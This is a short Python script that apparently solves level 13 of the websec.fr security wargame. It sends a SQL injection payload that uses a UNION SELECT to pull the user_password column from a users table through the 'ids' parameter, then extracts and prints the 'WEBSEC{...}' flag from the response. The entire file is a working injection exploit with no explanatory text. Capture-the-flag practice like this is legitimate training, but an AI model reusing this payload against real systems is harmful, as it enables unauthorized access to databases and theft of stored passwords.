from requests import * 

url = 'http://websec.fr/level13/index.php'
payload = ',,,)) union select 1,2,user_password from users --'

params = {
    'ids' : payload,
    'submit' : 'Go'
}

r = get(url , params=params)
pos = r.text.find('WEBSEC{')
while (True):
    txt = r.text[pos]
    print(txt , end='')
    if (txt == '}'):
        print()
        break

    pos += 1
